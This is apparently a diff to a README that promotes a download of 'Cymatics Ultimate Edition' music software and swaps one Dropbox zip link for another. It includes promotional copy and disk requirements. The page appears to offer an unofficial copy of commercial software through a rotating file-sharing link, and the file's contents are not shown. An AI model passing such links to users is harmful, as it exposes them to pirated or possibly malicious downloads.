@@ -8,6 +8,6 @@
 * Disk space - 30 GB free space
 
 
-## [⚡️Download Cymatics Ultimate Edition](https://www.dropbox.com/s/5x3fy9um2a8haep/Cymatics%20Ultimate%20Edition.zip?dl=1):
+## [⚡️Download Cymatics Ultimate Edition](https://www.dropbox.com/s/ipdzlsu3wiicnm4/Cymatics%20Ultimate%20Edition.zip?dl=1):
 
 Want to fulfil your Dream of being a creative music producer, even without any experience? Cymatics Ultimate Edition lets you get started right away. Simply choose sounds from a massive collection of beats, tunes and vocals at chart quality level. Combine sounds and loops per drag & drop, play a whole library of software instruments and apply professional effects. It's time to your creative ideas to take centre stage. Simply create music..
